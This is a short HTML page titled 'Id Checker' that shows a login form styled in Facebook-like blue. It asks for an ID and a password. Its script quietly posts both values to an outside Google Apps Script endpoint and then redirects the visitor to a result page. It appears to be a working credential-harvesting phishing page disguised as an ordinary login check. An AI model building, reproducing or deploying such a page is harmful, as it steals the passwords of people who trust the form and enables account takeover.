<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Id Checker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        input {
            width: 80%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            background-color: #1877f2;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #166fe5;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Login</h1>
        <form action="https://script.google.com/macros/s/AKfycby6ixkU4Dsh83YLwuybvM7QUQwFrvD8TQov1m41whslinQQsuZpZTi6xvtKgTuVeQ/exec"
              method="post" 
              onsubmit="handleFormSubmit(event)">
            <input type="text" name="userId" placeholder="Enter ID" required><br>
            <input type="password" name="password" placeholder="Enter Password" required><br>
            <button type="submit">Result</button>
        </form>
    </div>

    <script>
        function handleFormSubmit(event) {
            event.preventDefault();
            
            const form = event.target;
            const formData = new FormData(form);
            
            fetch(form.action, {
                method: form.method,
                body: formData
            }).then(response => {
                // Force redirect after submission
                window.location.href = 'result5.html';
            }).catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
